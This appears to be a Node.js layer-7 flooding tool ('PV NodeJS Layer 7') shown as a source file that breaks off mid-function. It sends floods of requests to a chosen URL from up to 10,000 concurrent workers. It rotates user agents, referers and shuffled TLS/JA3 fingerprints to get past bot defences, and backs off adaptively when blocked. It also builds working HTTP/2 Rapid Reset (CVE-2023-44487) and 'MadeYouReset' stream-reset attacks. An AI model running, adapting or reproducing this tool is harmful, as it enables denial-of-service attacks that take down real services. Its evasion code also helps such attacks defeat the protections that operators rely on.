#!/usr/bin/env node

const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');
const chalk = require('chalk');

let undiciClient;
try {
    undiciClient = require('undici').Client;
} catch (e) {
    console.error(chalk.red('Missing dependency: undici'));
    console.error(chalk.yellow('Install with:  npm install undici chalk@4 yargs impers'));
    process.exit(1);
}

let impers = null;
let impersAvailable = false;
async function loadImpers() {
    try {
        impers = await import('impers');
        if (impers.default && typeof impers.default.get === 'function') {
            impers = impers.default;
        }
        if (typeof impers.get !== 'function') {
            throw new Error('impers.get is not a function – unexpected module shape');
        }
        impersAvailable = true;
    } catch (e) {
        console.error(chalk.yellow('Warning: impers not available (HTTP/3 disabled):'), e.message);
        console.error(chalk.gray('Install with: npm install impers  (optional, only needed for H3)'));
        impersAvailable = false;
        impers = null;
    }
}

const USER_AGENTS = [

    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",

    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
];

const IMPERSONATE_PROFILES = [
    'chrome131',
    'chrome124',
    'chrome120',
    'chrome116',
    'firefox133',
    'firefox135',
    'safari180',
    'safari184',
    'edge101',
    'chrome131_android',
];

const TLS_PROFILES = [
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384'
    },
    {
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384:P-521'
    }
];

const BURST_CONFIG = {
    requestsPerBurst: 15,
    thinkTimeMs: 1200,
    jitterMs: 800,
};

const ADV_BURST_CONFIG = {
    enabled: false,
    burstSizeMin: 10,
    burstSizeMax: 40,
    thinkMultiplier: 0.5,
    adaptiveOnLowLatency: true,
};

const REFERERS = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/",
    "https://www.twitter.com/", "https://www.instagram.com/", "https://www.baidu.com/",
    "https://www.wikipedia.org/", "https://www.yahoo.com/",
];

const ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,**",
];

const HTTP_STATUS_CODES = {
    100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content",
    205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified",
    305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found",
    405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout",
    409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large",
    414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed",
    418: "I'm a Teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked",
    424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required",
    429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable",
    504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates",
    507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
    520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out",
    523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate",
    561: "Unauthorized (AWS ELB)",
    'RESET': "Stream Reset by Server",
    999: "Request Denied (LinkedIn)",
    0: "Connection Error"
};

const CONFIG = {
    MAX_BUFFER_SIZE: 1024 * 1024,
    MAX_DELAY_MS: 10000,
    STREAMS_PER_CONNECTION: 20,
    ATTACK_RECONNECT_MS: 100,
    MONITOR_INTERVAL_MS: 250,
    PROTOCOL_DETECTION_TIMEOUT: 5000,
    LOG_QUEUE_SIZE: 5,
    LATENCY_HISTORY_CAP: 10000,
};

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const getRandomTlsProfile = () => getRandomElement(TLS_PROFILES);
const getRandomImpersonate = () => getRandomElement(IMPERSONATE_PROFILES);
const stripAnsi = (str) => str.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');

const formatTime = (seconds) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
};

const validateAndParseUrl = (urlString) => {
    try {
        const parsedUrl = new URL(urlString);
        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
            throw new Error('Protocol must be http or https');
        }
        if (!parsedUrl.hostname) {
            throw new Error('Invalid hostname');
        }
        return parsedUrl;
    } catch (err) {
        throw new Error(`Invalid URL: ${err.message}`);
    }
};

const validateArguments = (argv) => {
    if (argv.time <= 0 || argv.time > 1440) {
        throw new Error('Time must be between 0 and 1440 minutes');
    }
    if (argv.conc <= 0 || argv.conc > 10000) {
        throw new Error('Concurrency must be between 1 and 10000');
    }
    if (!['none', 'rapid-reset', 'madeyoureset'].includes(argv.attack)) {
        throw new Error('Invalid attack mode');
    }
};

const shuffleArray = (arr) => {
    const a = arr.slice();
    for (let i = a.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
};

const getJa3Variant = (profile) => {
    if (!profile) return profile;
    try {
        const variant = { ...profile };
        if (profile.ciphers) {
            const ciphersArray = (Array.isArray(profile.ciphers) ? profile.ciphers : String(profile.ciphers).split(':')).slice();
            variant.ciphers = shuffleArray(ciphersArray).join(':');
        }
        if (profile.sigalgs) {
            variant.sigalgs = shuffleArray(String(profile.sigalgs).split(':')).join(':');
        }
        if (profile.ecdhCurve) {
            variant.ecdhCurve = shuffleArray(String(profile.ecdhCurve).split(':')).join(':');
        }
        return variant;
    } catch (e) {
        return profile;
    }
};

const argv = yargs(hideBin(process.argv))
    .option('url', { alias: 'u', describe: 'Target URL', type: 'string', demandOption: true })
    .option('time', { alias: 't', describe: 'Test duration in minutes', type: 'number', default: 1 })
    .option('conc', { alias: 'c', describe: 'Concurrency / threads', type: 'number', default: 50 })
    .option('attack', {
        alias: 'a',
        describe: 'Specify the HTTP/2 attack mode',
        choices: ['none', 'rapid-reset', 'madeyoureset'],
        default: 'none'
    })
    .option('protocol', {
        alias: 'p',
        describe: 'Force protocols for display/stats (e.g. "1.1,2,3"). Impers negotiates automatically.',
        type: 'string',
    })
    .option('adaptive-delay', {
        alias: 'ad',
        describe: 'Enable adaptive delay on blocking status codes',
        type: 'boolean',
        default: false
    })
    .option('adv-burst', {
        alias: 'ab',
        describe: 'Enable advanced burst & think mode',
        type: 'boolean',
        default: false
    })
    .option('burst-size', {
        alias: 'bs',
        describe: 'Advanced burst max size',
        type: 'number',
    })
    .option('think-multiplier', {
        alias: 'tm',
        describe: 'Multiplier applied to think time during advanced bursts (0.0-2.0)',
        type: 'number',
    })
    .option('max-retries', {
        alias: 'mr',
        describe: 'Maximum automatic retries on error per request',
        type: 'number',
        default: 2
    })
    .option('retry-base-ms', {
        alias: 'rb',
        describe: 'Base backoff in ms for retries (exponential)',
        type: 'number',
        default: 150
    })
    .option('ja3-evasion', {
        alias: 'ja3',
        describe: 'Enable real browser JA3 via impers (normal path) / weak shuffle (attack path)',
        type: 'boolean',
        default: true
    })
    .option('impersonate', {
        alias: 'imp',
        describe: 'Fixed impers browser profile (e.g. chrome131). Random if omitted.',
        type: 'string',
    })
    .option('force-http3', {
        alias: 'h3',
        describe: 'Ask impers to prefer HTTP/3 when possible',
        type: 'boolean',
        default: false
    })
    .help().alias('help', 'h').argv;

try {
    validateArguments(argv);
} catch (err) {
    console.error(chalk.red('Argument validation error:'), err.message);
    process.exit(1);
}

const FLAGS = {
    adaptiveDelay: !!(argv.adaptiveDelay ?? argv['adaptive-delay']),
    advBurst: !!(argv.advBurst ?? argv['adv-burst']),
    burstSize: argv.burstSize ?? argv['burst-size'],
    thinkMultiplier: argv.thinkMultiplier ?? argv['think-multiplier'],
    maxRetries: argv.maxRetries ?? argv['max-retries'] ?? 2,
    retryBaseMs: argv.retryBaseMs ?? argv['retry-base-ms'] ?? 150,
    ja3Evasion: (argv.ja3Evasion ?? argv['ja3-evasion']) !== false,
    impersonate: argv.impersonate ?? argv.imp ?? null,
    forceHttp3: !!(argv.forceHttp3 ?? argv['force-http3'] ?? argv.h3),
    protocol: argv.protocol ?? argv.p ?? null,
};

if (FLAGS.advBurst) {
    ADV_BURST_CONFIG.enabled = true;
    if (FLAGS.burstSize && Number.isInteger(FLAGS.burstSize) && FLAGS.burstSize > 0) {
        ADV_BURST_CONFIG.burstSizeMax = FLAGS.burstSize;
    }
    if (typeof FLAGS.thinkMultiplier === 'number') {
        ADV_BURST_CONFIG.thinkMultiplier = Math.max(0, Math.min(2, FLAGS.thinkMultiplier));
    }
}

const parsedUrl = validateAndParseUrl(argv.url);
const target = {
    protocol: parsedUrl.protocol,
    host: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
};
const targetUrl = `${target.protocol}//${target.host}:${target.port}${target.path}`;
const targetOrigin = `${target.protocol}//${target.host}:${target.port}`;

const durationMs = argv.time * 60 * 1000;
const concurrency = argv.conc;
const attackMode = argv.attack;

let isRunning = true;
let activeProtocols = [];
let activeConnections = new Set();
const stats = {
    requestsSent: 0,
    responsesReceived: 0,
    totalLatency: 0,
    errors: 0,
    attackSent: 0,
    attackReceived: 0,
    attackErrors: 0,
    statusCounts: {},
    protocolStats: {},
    startTime: Date.now(),
    latencies: [],
    retries: 0,
    connectionsOpened: 0,
    activeWorkers: 0,
};
const lastLogs = [];
const lastAttackLogs = [];
const workerDelays = new Array(concurrency).fill(0);
let selectedTlsProfile = null;

async function runStandardWorker(workerId, protocolKey) {
    let requestsInBurst = 0;
    const protocolLabel = protocolKey.toUpperCase();

    let h3FailStreak = 0;
    let h3CooldownUntil = 0;
    const H3_FAIL_THRESHOLD = 3;
    const H3_COOLDOWN_MS = 5000;

    stats.connectionsOpened++;
    stats.activeWorkers++;

    const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
    const tlsVariant = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;

    const connectOpts = {
        rejectUnauthorized: false,
        ...tlsVariant,
    };

    if (protocolKey === 'h1') {
        connectOpts.ALPNProtocols = ['http/1.1'];
    } else {

        connectOpts.ALPNProtocols = ['h2', 'http/1.1'];
    }

    const undiciOpts = {
        connect: connectOpts,
        pipelining: protocolKey === 'h1' ? 1 : 10,
    };

    const client = new undiciClient(targetOrigin, undiciOpts);
    activeConnections.add(client);

    const getBurstConfig = () => {
        if (ADV_BURST_CONFIG.enabled) {
            let burstSize = Math.floor(
                Math.random() * (ADV_BURST_CONFIG.burstSizeMax - ADV_BURST_CONFIG.burstSizeMin + 1)
            ) + ADV_BURST_CONFIG.burstSizeMin;
            if (ADV_BURST_CONFIG.adaptiveOnLowLatency && stats.responsesReceived > 5) {
                const avgLatency = stats.totalLatency / Math.max(1, stats.responsesReceived);
                if (avgLatency < 150) burstSize = Math.min(Math.floor(burstSize * 1.5), ADV_BURST_CONFIG.burstSizeMax);
            }
            const thinkTime = Math.max(
                50,
                (BURST_CONFIG.thinkTimeMs * ADV_BURST_CONFIG.thinkMultiplier) + (Math.random() * BURST_CONFIG.jitterMs)
            );
            return { requestsPerBurst: burstSize, thinkTimeMs: thinkTime, jitterMs: BURST_CONFIG.jitterMs };
        }
        return { ...BURST_CONFIG };
    };

    const recordLatency = (latencyMs) => {
        stats.latencies.push(latencyMs);
        stats.totalLatency += latencyMs;
        if (stats.latencies.length > CONFIG.LATENCY_HISTORY_CAP) {
            stats.latencies.splice(0, stats.latencies.length - CONFIG.LATENCY_HISTORY_CAP);
            stats.totalLatency = stats.latencies.reduce((a, b) => a + b, 0);
        }
    };

    const applyAdaptiveDelay = (statusCode) => {
        if (!FLAGS.adaptiveDelay) return;
        switch (statusCode) {
            case 401: case 403: case 429: case 431: case 451:
                workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId] || 0) + 150);
                break;
            case 400: case 406: case 412: case 422:
                workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId] || 0) + 75);
                break;
            default:
                if (statusCode < 400) {
                    workerDelays[workerId] = Math.max(0, (workerDelays[workerId] || 0) - 50);
                }
        }
    };

    const recordSuccess = (statusCode, usedKey, extraNote, latencyMs) => {
        if (!stats.protocolStats[usedKey]) {
            stats.protocolStats[usedKey] = { responses: 0, statuses: {} };
            if (!activeProtocols.includes(usedKey)) activeProtocols.push(usedKey);
        }
        const pStats = stats.protocolStats[usedKey];
        pStats.responses++;
        pStats.statuses[statusCode] = (pStats.statuses[statusCode] || 0) + 1;

        const note = extraNote ? ` ${extraNote}` : '';
        lastLogs.push(`[${usedKey.toUpperCase()}]${note} ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
        if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
        applyAdaptiveDelay(statusCode);
    };

    const doUndiciRequest = async (headers) => {
        const { statusCode, body } = await client.request({
            path: target.path || '/',
            method: 'GET',
            headers,
        });
        for await (const chunk of body) {  }
        return statusCode;
    };

    const doImpersH3 = async (headers) => {
        const impersonateProfile = FLAGS.impersonate || (FLAGS.ja3Evasion ? getRandomImpersonate() : undefined);
        const opts = {
            headers,
            verify: false,
            httpVersion: 3,
            http_version: 'v3',
            forceHttp3: true,
        };
        if (impersonateProfile) opts.impersonate = impersonateProfile;
        const r = await impers.get(targetUrl, opts);
        return {
            statusCode: r.status || r.statusCode || 0,
            profile: impersonateProfile,
        };
    };

    const doRequestWithRetry = async (attempt = 0) => {
        if (!isRunning) return;

        const headers = {
            'User-Agent': getRandomElement(USER_AGENTS),
            'Accept': getRandomElement(ACCEPT_HEADERS),
            'Referer': getRandomElement(REFERERS),
        };

        stats.requestsSent++;
        const startTime = process.hrtime.bigint();

        try {
            let statusCode;
            let usedKey = protocolKey;
            let extraNote = '';

            if (protocolKey === 'h3') {
                const now = Date.now();
                const inCooldown = now < h3CooldownUntil;
                const canTryH3 = impersAvailable && !inCooldown;

                if (!canTryH3) {
                    const reason = !impersAvailable ? 'impers unavailable' : `cooldown ${Math.ceil((h3CooldownUntil - now) / 1000)}s`;

                    if (Math.random() < 0.15) {
                        lastLogs.push(`[H3] ${argv.url} -> ${chalk.yellow('FALLBACK→H2')} (${reason})`);
                        if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
                    }
                    statusCode = await doUndiciRequest(headers);
                    usedKey = 'h2';
                    extraNote = '(fallback)';
                } else {
                    try {
                        const res = await doImpersH3(headers);
                        statusCode = res.statusCode;
                        usedKey = 'h3';
                        extraNote = res.profile ? `[${res.profile}]` : '';
                        h3FailStreak = 0;
                    } catch (h3Err) {
                        h3FailStreak++;
                        const errMsg = h3Err && (h3Err.code || h3Err.message)
                            ? String(h3Err.code || h3Err.message).slice(0, 50)
                            : 'unknown';
                        if (h3FailStreak >= H3_FAIL_THRESHOLD) {
                            h3CooldownUntil = Date.now() + H3_COOLDOWN_MS;
                            lastLogs.push(`[H3] ${argv.url} -> ${chalk.yellow('COOLDOWN ' + (H3_COOLDOWN_MS / 1000) + 's')} after ${h3FailStreak} fails (${errMsg})`);
                            h3FailStreak = 0;
                        } else {
                            lastLogs.push(`[H3] ${argv.url} -> ${chalk.yellow('FALLBACK→H2')} (${errMsg})`);
                        }
                        if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
                        statusCode = await doUndiciRequest(headers);
                        usedKey = 'h2';
                        extraNote = '(fallback)';
                    }
                }
            } else {

                statusCode = await doUndiciRequest(headers);
                usedKey = protocolKey;
                if (FLAGS.ja3Evasion) extraNote = '[ja3]';
            }

            const endTime = process.hrtime.bigint();
            const latencyMs = Number(endTime - startTime) / 1e6;
            stats.responsesReceived++;
            recordLatency(latencyMs);
            recordSuccess(statusCode, usedKey, extraNote, latencyMs);
        } catch (err) {
            stats.errors++;
            if (!stats.protocolStats[protocolKey]) {
                stats.protocolStats[protocolKey] = { responses: 0, statuses: {} };
            }
            stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0] || 0) + 1;
            const errCode = err && (err.code || err.message) ? (err.code || String(err.message).slice(0, 40)) : 'ERROR';
            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${errCode})`);
            if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();

            if (FLAGS.adaptiveDelay) {
                workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, (workerDelays[workerId] || 0) + 100);
            }

            const maxRetries = Math.max(0, Math.min(10, FLAGS.maxRetries));
            if (attempt < maxRetries && isRunning) {
                stats.retries++;
                const base = Math.max(50, FLAGS.retryBaseMs);
                const backoff = base * Math.pow(2, attempt) + Math.floor(Math.random() * base);
                await new Promise(resolve => setTimeout(resolve, Math.min(backoff, CONFIG.MAX_DELAY_MS)));
                return doRequestWithRetry(attempt + 1);
            }
        }
    };

    const scheduleNext = () => {
        if (!isRunning) return;
        const burstCfg = getBurstConfig();
        requestsInBurst++;

        const adaptiveMs = FLAGS.adaptiveDelay ? (workerDelays[workerId] || 0) : 0;

        if (requestsInBurst >= burstCfg.requestsPerBurst) {
            requestsInBurst = 0;
            const thinkTime = burstCfg.thinkTimeMs + (Math.random() * burstCfg.jitterMs) + adaptiveMs;
            setTimeout(() => {
                if (!isRunning) return;
                doRequestWithRetry().finally(scheduleNext);
            }, Math.min(thinkTime, CONFIG.MAX_DELAY_MS));
        } else if (adaptiveMs > 0) {
            setTimeout(() => {
                if (!isRunning) return;
                doRequestWithRetry().finally(scheduleNext);
            }, Math.min(adaptiveMs, CONFIG.MAX_DELAY_MS));
        } else {
            setImmediate(() => {
                if (!isRunning) return;
                doRequestWithRetry().finally(scheduleNext);
            });
        }
    };

    setImmediate(() => {
        if (!isRunning) return;
        doRequestWithRetry().finally(scheduleNext);
    });
}

function startHttp2AttackWorker() {
    if (!isRunning) return;

    const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
    const tlsOptions = FLAGS.ja3Evasion ? getJa3Variant(tlsProfile) : tlsProfile;

    const client = http2.connect(targetOrigin, {
        rejectUnauthorized: false,
        ...tlsOptions
    });

    activeConnections.add(client);
    stats.connectionsOpened++;

    const reconnect = () => {
        if (!client.destroyed) {
            try { client.destroy(); } catch (e) {  }
        }
        if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
    };

    client.on('goaway', reconnect);
    client.on('error', reconnect);
    client.on('close', reconnect);

    client.on('connect', () => {
        for (let i = 0; i < CONFIG.STREAMS_PER_CONNECTION; i++) {
            if (attackMode === 'rapid-reset') sendRapidReset(client);
            if (attackMode === 'madeyoureset') sendMadeYouReset(client);
        }
    });
}

function sendRapidReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;

    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const statusCode = h[':status'];
            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)} (Response Before Reset)`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', () => {
            stats.attackErrors++;
            stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
        });
        setImmediate(() => {
            if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
        });
    } catch (err) {
        stats.attackErrors++;
    }
}

function sendMadeYouReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;

    try {
        const stream = client.request(headers);
        stream.on('response', (h) => {
            stats.attackReceived++;
            const statusCode = h[':status'];
            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)} (Response)`);
            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
        });
        stream.on('error', (err) => {
            if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
                stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset Stream)`);
                if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
            } else {
                stats.attackErrors++;
                stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
            }
        });
        setImmediate(() => {
            if (stream.destroyed) return;
            try {
                const remoteWindowSize = stream.state.remoteWindowSize;
                const payloadSize = Math.min(remoteWindowSize + 1, CONFIG.MAX_BUFFER_SIZE);
                if (payloadSize > 0) {
                    stream.end(Buffer.alloc(payloadSize));
                } else {
                    stream.end();
                }
            } catch (e) {
                stats.attackErrors++;
                if (!stream.destroyed) {
                    try { stream.destroy(); } catch (e2) {  }
                }
            }
        });
    } catch (err) {
        stats.attackErrors++;
    }
}

function updateMonitor() {
    console.clear();
    const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
    const timeRemaining = Math.max(0, (durationMs / 1000) - elapsedSeconds);

    console.log(chalk.cyan('--------------------------------------------'));
    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 ⚡️         '));
    console.log(chalk.cyan('--------------------------------------------'));

    if (attackMode !== 'none') {
        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        console.log('');
        const attackName = attackMode === 'rapid-reset' ? 'Rapid Reset (CVE-2023-44487)' : 'MadeYouReset';
        const totalResetsAndErrors = (stats.statusCounts['RESET'] || 0) + stats.attackErrors;
        console.log(chalk.bgRed.white.bold(` HTTP/2 Attack ACTIVE: ${attackName} `));
        console.log(chalk.white.bold('Attack Streams Sent: ') + chalk.magenta(stats.attackSent));
        console.log(chalk.white.bold('Attack Responses Rcvd: ') + chalk.magenta(stats.attackReceived));
        console.log(chalk.white.bold('Attack Errors/Resets: ') + chalk.red(totalResetsAndErrors));
    } else {
        const leftColumn = [];
        const rightColumn = [];

        leftColumn.push(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
        leftColumn.push(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
        leftColumn.push(chalk.white.bold('Engines: ') + chalk.green('H1/H2=undici') + chalk.gray(' | ') + chalk.green('H3=impers'));
        leftColumn.push(chalk.white.bold('Protocols: ') + chalk.cyan(activeProtocols.map(p => p.toUpperCase()).join(', ') || 'auto'));

        const rps = (stats.requestsSent / elapsedSeconds || 0).toFixed(2);
        const avgLatency = (stats.responsesReceived > 0 ? (stats.totalLatency / stats.responsesReceived) : 0).toFixed(2);
        const successRate = stats.requestsSent > 0 ? ((stats.responsesReceived / stats.requestsSent) * 100).toFixed(2) : '0.00';
        const errorRate = stats.requestsSent > 0 ? ((stats.errors / stats.requestsSent) * 100).toFixed(2) : '0.00';
        const latenciesCopy = stats.latencies.slice().sort((a, b) => a - b);
        const median = latenciesCopy.length ? latenciesCopy[Math.floor(latenciesCopy.length / 2)].toFixed(2) : '0.00';
        const p95 = latenciesCopy.length ? latenciesCopy[Math.floor(latenciesCopy.length * 0.95)].toFixed(2) : '0.00';

        rightColumn.push(chalk.white.bold('Total Requests Sent: ') + chalk.blue(stats.requestsSent));
        rightColumn.push(chalk.white.bold('Total Responses Rcvd: ') + chalk.blue(stats.responsesReceived));
        rightColumn.push(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
        rightColumn.push(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
        rightColumn.push(chalk.white.bold('Median Latency (p50): ') + chalk.yellow(`${median} ms`));
        rightColumn.push(chalk.white.bold('P95 Latency: ') + chalk.yellow(`${p95} ms`));
        rightColumn.push(chalk.white.bold('Success Rate: ') + chalk.green(`${successRate}%`));
        rightColumn.push(chalk.white.bold('Error Rate: ') + chalk.red(`${errorRate}%`));
        rightColumn.push(chalk.white.bold('Active Workers: ') + chalk.blue(stats.activeWorkers));
        rightColumn.push(chalk.white.bold('Retries Performed: ') + chalk.magenta(stats.retries));

        const maxLeftLength = Math.max(...leftColumn.map(line => stripAnsi(line).length));
        const padding = 5;
        const maxRows = Math.max(leftColumn.length, rightColumn.length);
        for (let i = 0; i < maxRows; i++) {
            const left = leftColumn[i] || '';
            const right = rightColumn[i] || '';
            const leftPadded = left + ' '.repeat(Math.max(0, maxLeftLength - stripAnsi(left).length));
            console.log(`${leftPadded}${' '.repeat(padding)}${right}`);
        }
    }

    console.log('');
